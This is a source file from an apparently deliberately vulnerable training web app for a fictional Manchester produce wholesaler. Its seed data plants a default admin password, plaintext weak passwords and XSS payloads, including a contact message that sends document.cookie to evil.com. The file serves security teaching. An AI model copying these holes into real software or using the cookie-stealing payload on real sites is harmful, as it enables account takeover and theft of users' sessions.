import {
  type User,
  type InsertUser,
  type Product,
  type InsertProduct,
  type Order,
  type InsertOrder,
  type OrderItem,
  type InsertOrderItem,
  type Review,
  type InsertReview,
  type ContactSubmission,
  type InsertContact
} from "@shared/schema";
import { randomUUID } from "crypto";
import Database from "better-sqlite3";
import { initializeDatabase } from "./database";

export interface IStorage {
  // Users
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  getUserByCredentials(username: string, password: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  updateUser(id: string, updates: Partial<User>): Promise<User | undefined>;
  getAllUsers(): Promise<User[]>;

  // Products
  getAllProducts(): Promise<Product[]>;
  getProduct(id: string): Promise<Product | undefined>;
  createProduct(product: InsertProduct): Promise<Product>;
  searchProducts(query: string): Promise<Product[]>;

  // Orders
  getAllOrders(): Promise<Order[]>;
  getUserOrders(userId: string): Promise<Order[]>;
  getOrder(id: string): Promise<Order | undefined>;
  createOrder(order: InsertOrder): Promise<Order>;
  updateOrderStatus(id: string, status: string): Promise<Order | undefined>;

  // Order Items
  getOrderItems(orderId: string): Promise<OrderItem[]>;
  createOrderItem(item: InsertOrderItem): Promise<OrderItem>;

  // Reviews
  getProductReviews(productId: string): Promise<Review[]>;
  createReview(review: InsertReview): Promise<Review>;

  // Contact submissions
  getAllContactSubmissions(): Promise<ContactSubmission[]>;
  createContactSubmission(contact: InsertContact): Promise<ContactSubmission>;
}

export class MemStorage implements IStorage {
  private users: Map<string, User>;
  private products: Map<string, Product>;
  private orders: Map<string, Order>;
  private orderItems: Map<string, OrderItem>;
  private reviews: Map<string, Review>;
  private contacts: Map<string, ContactSubmission>;
  private orderCounter: number = 1000;

  constructor() {
    this.users = new Map();
    this.products = new Map();
    this.orders = new Map();
    this.orderItems = new Map();
    this.reviews = new Map();
    this.contacts = new Map();
    this.seedData();
  }

  private seedData() {
    // VULNERABILITY: Default admin credentials
    const adminId = randomUUID();
    this.users.set(adminId, {
      id: adminId,
      username: "admin",
      password: "admin123", // VULNERABILITY: Plaintext password
      email: "admin@manchesterfresh.co.uk",
      companyName: "Manchester Fresh Foods",
      contactPerson: "System Administrator",
      phone: "0161 234 5678",
      address: "Unit 14, Trafford Park, Manchester M17 1DB",
      role: "admin",
      bio: null,
    });

    // Create multiple customer accounts
    const customers = [
      {
        username: "thepubco",
        password: "welcome123", // VULNERABILITY: Weak password
        email: "orders@thepubcompany.co.uk",
        companyName: "The Pub Company Ltd",
        contactPerson: "Sarah Johnson",
        phone: "0161 789 4521",
        address: "45 Deansgate, Manchester M3 2AY",
        bio: "Chain of traditional pubs across Greater Manchester serving British classics",
      },
      {
        username: "bella_italia",
        password: "pasta2024", // VULNERABILITY: Weak password
        email: "procurement@bella-italia.co.uk",
        companyName: "Bella Italia Restaurant",
        contactPerson: "Marco Rossi",
        phone: "0161 832 6574",
        address: "78 King Street, Manchester M2 4WQ",
        bio: "Authentic Italian restaurant in the heart of Manchester. Est. 2015",
      },
      {
        username: "green_leaf",
        password: "healthy1", // VULNERABILITY: Weak password
        email: "manager@greenleafcafe.com",
        companyName: "Green Leaf Café",
        contactPerson: "Emma Williams",
        phone: "0161 955 3344",
        address: "12 Oxford Road, Manchester M1 5QA",
        bio: "Vegetarian and vegan café promoting sustainable local produce",
      },
      {
        username: "royal_curry",
        password: "spice99", // VULNERABILITY: Weak password
        email: "kitchen@royalcurryhouse.co.uk",
        companyName: "Royal Curry House",
        contactPerson: "Raj Patel",
        phone: "0161 273 8899",
        address: "156 Wilmslow Road, Manchester M14 5LH",
        bio: "Award-winning Indian restaurant specialising in authentic curries. VULNERABILITY: <script>alert('xss')</script>", // VULNERABILITY: XSS in bio
      },
      {
        username: "cityhotel",
        password: "hotel2024", // VULNERABILITY: Weak password
        email: "catering@manchestercityhotel.com",
        companyName: "Manchester City Hotel",
        contactPerson: "David Chen",
        phone: "0161 234 9876",
        address: "200 Portland Street, Manchester M1 3HU",
        bio: "4-star hotel with conference facilities and two restaurants",
      },
      {
        username: "testuser",
        password: "testpass123",
        email: "test@restaurant.com",
        companyName: "Test Restaurant",
        contactPerson: "John Smith",
        phone: "0161 555 0123",
        address: "123 Main St, Manchester M1 1AA",
        role: "customer",
        bio: "Popular restaurant in Manchester city centre",
      },
    ];

    const customerIds = customers.map(c => {
      const id = randomUUID();
      this.users.set(id, {
        id,
        username: c.username,
        password: c.password,
        email: c.email,
        companyName: c.companyName,
        contactPerson: c.contactPerson,
        phone: c.phone,
        address: c.address,
        role: "customer",
        bio: c.bio,
      });
      return { id, username: c.username };
    });

    // Seed products
    const vegetables = [
      { name: "Fresh Tomatoes", description: "Vine-ripened tomatoes", category: "vegetables", unit: "kg", price: "3.50", imageUrl: "", stock: 100 },
      { name: "Baby Spinach", description: "Tender baby spinach leaves", category: "vegetables", unit: "kg", price: "4.20", imageUrl: "", stock: 80 },
      { name: "Carrots", description: "Fresh organic carrots", category: "vegetables", unit: "kg", price: "2.80", imageUrl: "", stock: 150 },
      { name: "Red Bell Peppers", description: "Sweet red peppers", category: "vegetables", unit: "kg", price: "5.00", imageUrl: "", stock: 90 },
      { name: "Mixed Salad Leaves", description: "Fresh mixed lettuce", category: "vegetables", unit: "kg", price: "3.80", imageUrl: "", stock: 70 },
    ];

    const fruits = [
      { name: "Fresh Strawberries", description: "Sweet British strawberries", category: "fruits", unit: "punnet", price: "4.50", imageUrl: "", stock: 60 },
      { name: "Apples (Braeburn)", description: "Crisp eating apples", category: "fruits", unit: "kg", price: "3.20", imageUrl: "", stock: 120 },
      { name: "Bananas", description: "Ripe yellow bananas", category: "fruits", unit: "kg", price: "2.50", imageUrl: "", stock: 150 },
      { name: "Fresh Oranges", description: "Juicy Valencia oranges", category: "fruits", unit: "kg", price: "3.80", imageUrl: "", stock: 100 },
      { name: "Blueberries", description: "Fresh blueberries", category: "fruits", unit: "punnet", price: "5.20", imageUrl: "", stock: 50 },
    ];

    const herbs = [
      { name: "Fresh Basil", description: "Aromatic basil leaves", category: "herbs", unit: "bunch", price: "1.80", imageUrl: "", stock: 40 },
      { name: "Fresh Parsley", description: "Flat-leaf parsley", category: "herbs", unit: "bunch", price: "1.50", imageUrl: "", stock: 50 },
      { name: "Fresh Coriander", description: "Fresh coriander", category: "herbs", unit: "bunch", price: "1.60", imageUrl: "", stock: 45 },
    ];

    const productIds: string[] = [];
    [...vegetables, ...fruits, ...herbs].forEach(p => {
      const id = randomUUID();
      this.products.set(id, {
        id,
        name: p.name,
        description: p.description,
        category: p.category,
        unit: p.unit,
        pricePerUnit: p.price,
        imageUrl: p.imageUrl,
        stock: p.stock,
      });
      productIds.push(id);
    });

    // Create historical orders for customers
    const now = new Date();
    const daysAgo = (days: number) => new Date(now.getTime() - days * 24 * 60 * 60 * 1000);

    // The Pub Company - Regular weekly orders
    const pubOrder1 = this.createOrderSync(customerIds[0].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 15, price: "3.50" },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 10, price: "3.80" },
      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 8, price: "3.20" },
    ], "delivered", daysAgo(14), "45 Deansgate, Manchester M3 2AY", "Weekly order - all good quality");

    const pubOrder2 = this.createOrderSync(customerIds[0].id, [
      { productId: productIds[2], name: "Carrots", quantity: 12, price: "2.80" },
      { productId: productIds[1], name: "Baby Spinach", quantity: 8, price: "4.20" },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 10, price: "5.00" },
    ], "delivered", daysAgo(7), "45 Deansgate, Manchester M3 2AY", null);

    const pubOrder3 = this.createOrderSync(customerIds[0].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 15, price: "3.50" },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 10, price: "3.80" },
      { productId: productIds[10], name: "Fresh Basil", quantity: 5, price: "1.80" },
    ], "confirmed", daysAgo(0), "45 Deansgate, Manchester M3 2AY", "Please deliver before 10am");

    // Bella Italia - Italian restaurant orders
    const italianOrder1 = this.createOrderSync(customerIds[1].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 25, price: "3.50" },
      { productId: productIds[10], name: "Fresh Basil", quantity: 15, price: "1.80" },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 12, price: "5.00" },
    ], "delivered", daysAgo(10), "78 King Street, Manchester M2 4WQ", "Grazie! <img src=x onerror=alert('xss')>"); // VULNERABILITY: XSS in order notes

    const italianOrder2 = this.createOrderSync(customerIds[1].id, [
      { productId: productIds[1], name: "Baby Spinach", quantity: 10, price: "4.20" },
      { productId: productIds[11], name: "Fresh Parsley", quantity: 8, price: "1.50" },
      { productId: productIds[8], name: "Fresh Oranges", quantity: 15, price: "3.80" },
    ], "confirmed", daysAgo(2), "78 King Street, Manchester M2 4WQ", null);

    // Green Leaf Café - Organic produce
    const cafeOrder1 = this.createOrderSync(customerIds[2].id, [
      { productId: productIds[1], name: "Baby Spinach", quantity: 20, price: "4.20" },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 15, price: "3.80" },
      { productId: productIds[5], name: "Fresh Strawberries", quantity: 12, price: "4.50" },
      { productId: productIds[9], name: "Blueberries", quantity: 10, price: "5.20" },
    ], "delivered", daysAgo(5), "12 Oxford Road, Manchester M1 5QA", "All organic please");

    const cafeOrder2 = this.createOrderSync(customerIds[2].id, [
      { productId: productIds[2], name: "Carrots", quantity: 8, price: "2.80" },
      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 10, price: "3.20" },
      { productId: productIds[7], name: "Bananas", quantity: 15, price: "2.50" },
    ], "pending", daysAgo(1), "12 Oxford Road, Manchester M1 5QA", "Urgent - event tomorrow");

    // Royal Curry House - Herbs and vegetables
    const curryOrder1 = this.createOrderSync(customerIds[3].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 18, price: "3.50" },
      { productId: productIds[12], name: "Fresh Coriander", quantity: 20, price: "1.60" },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 15, price: "5.00" },
    ], "delivered", daysAgo(12), "156 Wilmslow Road, Manchester M14 5LH", null);

    const curryOrder2 = this.createOrderSync(customerIds[3].id, [
      { productId: productIds[2], name: "Carrots", quantity: 10, price: "2.80" },
      { productId: productIds[1], name: "Baby Spinach", quantity: 12, price: "4.20" },
      { productId: productIds[12], name: "Fresh Coriander", quantity: 15, price: "1.60" },
    ], "confirmed", daysAgo(3), "156 Wilmslow Road, Manchester M14 5LH", "Please ring doorbell");

    // City Hotel - Large orders
    const hotelOrder1 = this.createOrderSync(customerIds[4].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 30, price: "3.50" },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 25, price: "3.80" },
      { productId: productIds[5], name: "Fresh Strawberries", quantity: 20, price: "4.50" },
      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 20, price: "3.20" },
      { productId: productIds[8], name: "Fresh Oranges", quantity: 25, price: "3.80" },
    ], "delivered", daysAgo(8), "200 Portland Street, Manchester M1 3HU", "Conference this weekend - large order");

    const hotelOrder2 = this.createOrderSync(customerIds[4].id, [
      { productId: productIds[1], name: "Baby Spinach", quantity: 15, price: "4.20" },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 18, price: "5.00" },
      { productId: productIds[7], name: "Bananas", quantity: 30, price: "2.50" },
    ], "pending", daysAgo(0), "200 Portland Street, Manchester M1 3HU", null);

    // Add some product reviews
    this.reviews.set(randomUUID(), {
      id: randomUUID(),
      productId: productIds[0], // Fresh Tomatoes
      userId: customerIds[0].id,
      username: "thepubco",
      rating: 5,
      comment: "Excellent quality tomatoes, always fresh and vine-ripened. Our customers love them!",
      createdAt: daysAgo(15),
    });

    this.reviews.set(randomUUID(), {
      id: randomUUID(),
      productId: productIds[10], // Fresh Basil
      userId: customerIds[1].id,
      username: "bella_italia",
      rating: 5,
      comment: "Perfetto! The basil is always aromatic and fresh. Essential for our pasta dishes.",
      createdAt: daysAgo(11),
    });

    this.reviews.set(randomUUID(), {
      id: randomUUID(),
      productId: productIds[1], // Baby Spinach
      userId: customerIds[2].id,
      username: "green_leaf",
      rating: 4,
      comment: "Good quality organic spinach. Would prefer slightly larger bags though.",
      createdAt: daysAgo(6),
    });

    this.reviews.set(randomUUID(), {
      id: randomUUID(),
      productId: productIds[12], // Fresh Coriander
      userId: customerIds[3].id,
      username: "royal_curry",
      rating: 5,
      comment: "Fresh coriander essential for authentic curries. Always top quality! <script>alert('review-xss')</script>", // VULNERABILITY: XSS in review
      createdAt: daysAgo(13),
    });

    // Add some contact form submissions
    this.contacts.set(randomUUID(), {
      id: randomUUID(),
      name: "Tom Baker",
      email: "tom@newcafe.co.uk",
      company: "The New Café",
      message: "Hi, I'm opening a new café in Didsbury and would like to discuss wholesale pricing for fruit and vegetables. Could someone contact me?",
      createdAt: daysAgo(4),
    });

    this.contacts.set(randomUUID(), {
      id: randomUUID(),
      name: "Lisa Morton",
      email: "lisa.morton@catering.com",
      company: "Morton Events",
      message: "We run corporate catering events and need a reliable supplier for fresh produce. Do you offer next-day delivery? <img src=x onerror=fetch('http://evil.com/?cookie='+document.cookie)>", // VULNERABILITY: XSS in contact form
      createdAt: daysAgo(2),
    });

    this.contacts.set(randomUUID(), {
      id: randomUUID(),
      name: "James Wilson",
      email: "james@wilsonrestaurants.co.uk",
      company: null,
      message: "Question about your organic certification. Do you have documentation I can review?",
      createdAt: daysAgo(6),
    });
  }

  private createOrderSync(
    userId: string,
    items: Array<{ productId: string; name: string; quantity: number; price: string }>,
    status: string,
    createdAt: Date,
    deliveryAddress: string,
    notes: string | null
  ): string {
    const orderId = randomUUID();
    const orderNumber = `MFF-${this.orderCounter++}`;
    const totalAmount = items.reduce((sum, item) =>
      sum + (parseFloat(item.price) * item.quantity), 0
    ).toFixed(2);

    this.orders.set(orderId, {
      id: orderId,
      orderNumber,
      userId,
      status,
      totalAmount,
      deliveryDate: status === "pending" ? null : createdAt.toISOString(),
      deliveryAddress,
      notes,
      createdAt,
    });

    items.forEach(item => {
      const itemId = randomUUID();
      const subtotal = (parseFloat(item.price) * item.quantity).toFixed(2);
      this.orderItems.set(itemId, {
        id: itemId,
        orderId,
        productId: item.productId,
        productName: item.name,
        quantity: item.quantity,
        pricePerUnit: item.price,
        subtotal,
      });
    });

    return orderId;
  }

  // Users
  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async getUserByCredentials(username: string, password: string): Promise<User | undefined> {
    // MemStorage is safe by default as it doesn't use SQL
    return Array.from(this.users.values()).find(
      (user) => user.username === username && user.password === password
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const user: User = {
      ...insertUser,
      id,
      role: "customer",
      companyName: insertUser.companyName || null,
      contactPerson: insertUser.contactPerson || null,
      phone: insertUser.phone || null,
      address: insertUser.address || null,
      bio: insertUser.bio || null,
    };
    this.users.set(id, user);
    return user;
  }

  async updateUser(id: string, updates: Partial<User>): Promise<User | undefined> {
    const user = this.users.get(id);
    if (!user) return undefined;
    const updated = { ...user, ...updates };
    this.users.set(id, updated);
    return updated;
  }

  async getAllUsers(): Promise<User[]> {
    return Array.from(this.users.values());
  }

  // Products
  async getAllProducts(): Promise<Product[]> {
    return Array.from(this.products.values());
  }

  async getProduct(id: string): Promise<Product | undefined> {
    return this.products.get(id);
  }

  async createProduct(insertProduct: InsertProduct): Promise<Product> {
    const id = randomUUID();
    const product: Product = {
      ...insertProduct,
      id,
      description: insertProduct.description || null,
      imageUrl: insertProduct.imageUrl || null,
      stock: insertProduct.stock || 0,
    };
    this.products.set(id, product);
    return product;
  }

  async searchProducts(query: string): Promise<Product[]> {
    const lowerQuery = query.toLowerCase();
    return Array.from(this.products.values()).filter(p =>
      p.name.toLowerCase().includes(lowerQuery) ||
      p.category.toLowerCase().includes(lowerQuery)
    );
  }

  // Orders
  async getAllOrders(): Promise<Order[]> {
    return Array.from(this.orders.values())
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
  }

  async getUserOrders(userId: string): Promise<Order[]> {
    return Array.from(this.orders.values()).filter(o => o.userId === userId);
  }

  async getOrder(id: string): Promise<Order | undefined> {
    return this.orders.get(id);
  }

  async createOrder(insertOrder: InsertOrder): Promise<Order> {
    const id = randomUUID();
    const orderNumber = `MFF-${this.orderCounter++}`;
    const order: Order = {
      id,
      orderNumber,
      userId: insertOrder.userId,
      status: insertOrder.status || "pending",
      totalAmount: insertOrder.totalAmount,
      deliveryDate: insertOrder.deliveryDate || null,
      deliveryAddress: insertOrder.deliveryAddress || null,
      notes: insertOrder.notes || null,
      createdAt: new Date(),
    };
    this.orders.set(id, order);
    return order;
  }

  async updateOrderStatus(id: string, status: string): Promise<Order | undefined> {
    const order = this.orders.get(id);
    if (!order) return undefined;
    order.status = status;
    this.orders.set(id, order);
    return order;
  }

  // Order Items
  async getOrderItems(orderId: string): Promise<OrderItem[]> {
    return Array.from(this.orderItems.values()).filter(item => item.orderId === orderId);
  }

  async createOrderItem(insertItem: InsertOrderItem): Promise<OrderItem> {
    const id = randomUUID();
    const item: OrderItem = { ...insertItem, id };
    this.orderItems.set(id, item);
    return item;
  }

  // Reviews
  async getProductReviews(productId: string): Promise<Review[]> {
    return Array.from(this.reviews.values()).filter(r => r.productId === productId);
  }

  async createReview(insertReview: InsertReview): Promise<Review> {
    const id = randomUUID();

    // Get username from user
    const user = await this.getUser(insertReview.userId);
    const username = user?.username || "Unknown";

    const review: Review = {
      ...insertReview,
      id,
      username,
      comment: insertReview.comment || null,
      createdAt: new Date(),
    };
    this.reviews.set(id, review);
    return review;
  }

  // Contact submissions
  async getAllContactSubmissions(): Promise<ContactSubmission[]> {
    return Array.from(this.contacts.values());
  }

  async createContactSubmission(insertContact: InsertContact): Promise<ContactSubmission> {
    const id = randomUUID();
    const contact: ContactSubmission = {
      ...insertContact,
      id,
      company: insertContact.company || null,
      createdAt: new Date(),
    };
    this.contacts.set(id, contact);
    return contact;
  }
}

// SQLite Storage with INTENTIONALLY VULNERABLE SQL queries for educational purposes
export class SQLiteStorage implements IStorage {
  private db: Database.Database;
  private orderCounter: number = 1000;

  constructor(db: Database.Database) {
    this.db = db;
    this.seedData();
  }

  private seedData() {
    // Check if already seeded
    const userCount = this.db.prepare("SELECT COUNT(*) as count FROM users").get() as { count: number };
    if (userCount.count > 0) {
      // Already seeded, get current order counter
      const lastOrder = this.db.prepare("SELECT order_number FROM orders ORDER BY order_number DESC LIMIT 1").get() as { order_number?: string };
      if (lastOrder?.order_number) {
        const match = lastOrder.order_number.match(/MFF-(\d+)/);
        if (match) {
          this.orderCounter = parseInt(match[1]) + 1;
        }
      }
      return;
    }

    // VULNERABILITY: Default admin credentials + plaintext password
    const adminId = randomUUID();
    this.db.prepare(`
      INSERT INTO users (id, username, password, email, company_name, contact_person, phone, address, role, bio)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      adminId,
      "admin",
      "admin123", // VULNERABILITY: Plaintext password
      "admin@manchesterfresh.co.uk",
      "Manchester Fresh Foods",
      "System Administrator",
      "0161 234 5678",
      "Unit 14, Trafford Park, Manchester M17 1DB",
      "admin",
      null
    );

    // Create customer accounts with weak passwords
    const customers = [
      {
        username: "thepubco",
        password: "welcome123",
        email: "orders@thepubcompany.co.uk",
        companyName: "The Pub Company Ltd",
        contactPerson: "Sarah Johnson",
        phone: "0161 789 4521",
        address: "45 Deansgate, Manchester M3 2AY",
        bio: "Chain of traditional pubs across Greater Manchester serving British classics",
      },
      {
        username: "bella_italia",
        password: "pasta2024",
        email: "procurement@bella-italia.co.uk",
        companyName: "Bella Italia Restaurant",
        contactPerson: "Marco Rossi",
        phone: "0161 832 6574",
        address: "78 King Street, Manchester M2 4WQ",
        bio: "Authentic Italian restaurant in the heart of Manchester. Est. 2015",
      },
      {
        username: "green_leaf",
        password: "healthy1",
        email: "manager@greenleafcafe.com",
        companyName: "Green Leaf Café",
        contactPerson: "Emma Williams",
        phone: "0161 955 3344",
        address: "12 Oxford Road, Manchester M1 5QA",
        bio: "Vegetarian and vegan café promoting sustainable local produce",
      },
      {
        username: "royal_curry",
        password: "spice99",
        email: "kitchen@royalcurryhouse.co.uk",
        companyName: "Royal Curry House",
        contactPerson: "Raj Patel",
        phone: "0161 273 8899",
        address: "156 Wilmslow Road, Manchester M14 5LH",
        bio: "Award-winning Indian restaurant specialising in authentic curries. VULNERABILITY: <script>alert('xss')</script>",
      },
      {
        username: "cityhotel",
        password: "hotel2024",
        email: "catering@manchestercityhotel.com",
        companyName: "Manchester City Hotel",
        contactPerson: "David Chen",
        phone: "0161 234 9876",
        address: "200 Portland Street, Manchester M1 3HU",
        bio: "4-star hotel with conference facilities and two restaurants",
      },
      {
        username: "testuser",
        password: "testpass123",
        email: "test@restaurant.com",
        companyName: "Test Restaurant",
        contactPerson: "John Smith",
        phone: "0161 555 0123",
        address: "123 Main St, Manchester M1 1AA",
        bio: "Popular restaurant in Manchester city centre",
      },
    ];

    const customerIds: string[] = [];
    const insertUserStmt = this.db.prepare(`
      INSERT INTO users (id, username, password, email, company_name, contact_person, phone, address, role, bio)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'customer', ?)
    `);

    customers.forEach(c => {
      const id = randomUUID();
      insertUserStmt.run(id, c.username, c.password, c.email, c.companyName, c.contactPerson, c.phone, c.address, c.bio);
      customerIds.push(id);
    });

    // Seed products
    const vegetables = [
      { name: "Fresh Tomatoes", description: "Vine-ripened tomatoes", category: "vegetables", unit: "kg", price: 3.50, stock: 100 },
      { name: "Baby Spinach", description: "Tender baby spinach leaves", category: "vegetables", unit: "kg", price: 4.20, stock: 80 },
      { name: "Carrots", description: "Fresh organic carrots", category: "vegetables", unit: "kg", price: 2.80, stock: 150 },
      { name: "Red Bell Peppers", description: "Sweet red peppers", category: "vegetables", unit: "kg", price: 5.00, stock: 90 },
      { name: "Mixed Salad Leaves", description: "Fresh mixed lettuce", category: "vegetables", unit: "kg", price: 3.80, stock: 70 },
    ];

    const fruits = [
      { name: "Fresh Strawberries", description: "Sweet British strawberries", category: "fruits", unit: "punnet", price: 4.50, stock: 60 },
      { name: "Apples (Braeburn)", description: "Crisp eating apples", category: "fruits", unit: "kg", price: 3.20, stock: 120 },
      { name: "Bananas", description: "Ripe yellow bananas", category: "fruits", unit: "kg", price: 2.50, stock: 150 },
      { name: "Fresh Oranges", description: "Juicy Valencia oranges", category: "fruits", unit: "kg", price: 3.80, stock: 100 },
      { name: "Blueberries", description: "Fresh blueberries", category: "fruits", unit: "punnet", price: 5.20, stock: 50 },
    ];

    const herbs = [
      { name: "Fresh Basil", description: "Aromatic basil leaves", category: "herbs", unit: "bunch", price: 1.80, stock: 40 },
      { name: "Fresh Parsley", description: "Flat-leaf parsley", category: "herbs", unit: "bunch", price: 1.50, stock: 50 },
      { name: "Fresh Coriander", description: "Fresh coriander", category: "herbs", unit: "bunch", price: 1.60, stock: 45 },
    ];

    const productIds: string[] = [];
    const insertProductStmt = this.db.prepare(`
      INSERT INTO products (id, name, description, category, unit, price_per_unit, image_url, stock)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);

    [...vegetables, ...fruits, ...herbs].forEach(p => {
      const id = randomUUID();
      insertProductStmt.run(id, p.name, p.description, p.category, p.unit, p.price, "", p.stock);
      productIds.push(id);
    });

    // Create historical orders
    const now = new Date();
    const daysAgo = (days: number) => new Date(now.getTime() - days * 24 * 60 * 60 * 1000).toISOString();

    // Helper function to create order
    const createOrderSync = (
      userId: string,
      items: Array<{ productId: string; name: string; quantity: number; price: number }>,
      status: string,
      createdAt: string,
      deliveryAddress: string,
      notes: string | null
    ) => {
      const orderId = randomUUID();
      const orderNumber = `MFF-${this.orderCounter++}`;
      const totalAmount = items.reduce((sum, item) => sum + (item.price * item.quantity), 0);

      this.db.prepare(`
        INSERT INTO orders (id, user_id, order_number, status, total_amount, delivery_date, delivery_address, notes, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
      `).run(orderId, userId, orderNumber, status, totalAmount, status !== "pending" ? createdAt : null, deliveryAddress, notes, createdAt);

      const insertItemStmt = this.db.prepare(`
        INSERT INTO order_items (id, order_id, product_id, product_name, quantity, price_per_unit, subtotal)
        VALUES (?, ?, ?, ?, ?, ?, ?)
      `);

      items.forEach(item => {
        const itemId = randomUUID();
        const subtotal = item.price * item.quantity;
        insertItemStmt.run(itemId, orderId, item.productId, item.name, item.quantity, item.price, subtotal);
      });
    };

    // The Pub Company orders
    createOrderSync(customerIds[0], [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 15, price: 3.50 },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 10, price: 3.80 },
      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 8, price: 3.20 },
    ], "delivered", daysAgo(14), "45 Deansgate, Manchester M3 2AY", "Weekly order - all good quality");

    createOrderSync(customerIds[0], [
      { productId: productIds[2], name: "Carrots", quantity: 12, price: 2.80 },
      { productId: productIds[1], name: "Baby Spinach", quantity: 8, price: 4.20 },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 10, price: 5.00 },
    ], "delivered", daysAgo(7), "45 Deansgate, Manchester M3 2AY", null);

    createOrderSync(customerIds[0], [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 15, price: 3.50 },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 10, price: 3.80 },
      { productId: productIds[10], name: "Fresh Basil", quantity: 5, price: 1.80 },
    ], "confirmed", daysAgo(0), "45 Deansgate, Manchester M3 2AY", "Please deliver before 10am");

    // Bella Italia orders
    createOrderSync(customerIds[1], [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 25, price: 3.50 },
      { productId: productIds[10], name: "Fresh Basil", quantity: 15, price: 1.80 },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 12, price: 5.00 },
    ], "delivered", daysAgo(10), "78 King Street, Manchester M2 4WQ", "Grazie! <img src=x onerror=alert('xss')>");

    createOrderSync(customerIds[1], [
      { productId: productIds[1], name: "Baby Spinach", quantity: 10, price: 4.20 },
      { productId: productIds[11], name: "Fresh Parsley", quantity: 8, price: 1.50 },
      { productId: productIds[8], name: "Fresh Oranges", quantity: 15, price: 3.80 },
    ], "confirmed", daysAgo(2), "78 King Street, Manchester M2 4WQ", null);

    // Green Leaf Café orders
    createOrderSync(customerIds[2], [
      { productId: productIds[1], name: "Baby Spinach", quantity: 20, price: 4.20 },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 15, price: 3.80 },
      { productId: productIds[5], name: "Fresh Strawberries", quantity: 12, price: 4.50 },
      { productId: productIds[9], name: "Blueberries", quantity: 10, price: 5.20 },
    ], "delivered", daysAgo(5), "12 Oxford Road, Manchester M1 5QA", "All organic please");

    createOrderSync(customerIds[2], [
      { productId: productIds[2], name: "Carrots", quantity: 8, price: 2.80 },
      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 10, price: 3.20 },
      { productId: productIds[7], name: "Bananas", quantity: 15, price: 2.50 },
    ], "pending", daysAgo(1), "12 Oxford Road, Manchester M1 5QA", "Urgent - event tomorrow");

    // Royal Curry House orders
    createOrderSync(customerIds[3], [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 18, price: 3.50 },
      { productId: productIds[12], name: "Fresh Coriander", quantity: 20, price: 1.60 },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 15, price: 5.00 },
    ], "delivered", daysAgo(12), "156 Wilmslow Road, Manchester M14 5LH", null);

    createOrderSync(customerIds[3], [
      { productId: productIds[2], name: "Carrots", quantity: 10, price: 2.80 },
      { productId: productIds[1], name: "Baby Spinach", quantity: 12, price: 4.20 },
      { productId: productIds[12], name: "Fresh Coriander", quantity: 15, price: 1.60 },
    ], "confirmed", daysAgo(3), "156 Wilmslow Road, Manchester M14 5LH", "Please ring doorbell");

    // City Hotel orders
    createOrderSync(customerIds[4], [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 30, price: 3.50 },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 25, price: 3.80 },
      { productId: productIds[5], name: "Fresh Strawberries", quantity: 20, price: 4.50 },
      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 20, price: 3.20 },
      { productId: productIds[8], name: "Fresh Oranges", quantity: 25, price: 3.80 },
    ], "delivered", daysAgo(8), "200 Portland Street, Manchester M1 3HU", "Conference this weekend - large order");

    createOrderSync(customerIds[4], [
      { productId: productIds[1], name: "Baby Spinach", quantity: 15, price: 4.20 },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 18, price: 5.00 },
      { productId: productIds[7], name: "Bananas", quantity: 30, price: 2.50 },
    ], "pending", daysAgo(0), "200 Portland Street, Manchester M1 3HU", null);

    // Add reviews with XSS
    const insertReviewStmt = this.db.prepare(`
      INSERT INTO reviews (id, product_id, user_id, username, rating, comment, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertReviewStmt.run(randomUUID(), productIds[0], customerIds[0], "thepubco", 5,
      "Excellent quality tomatoes, always fresh and vine-ripened. Our customers love them!", daysAgo(15));

    insertReviewStmt.run(randomUUID(), productIds[10], customerIds[1], "bella_italia", 5,
      "Perfetto! The basil is always aromatic and fresh. Essential for our pasta dishes.", daysAgo(11));

    insertReviewStmt.run(randomUUID(), productIds[1], customerIds[2], "green_leaf", 4,
      "Good quality organic spinach. Would prefer slightly larger bags though.", daysAgo(6));

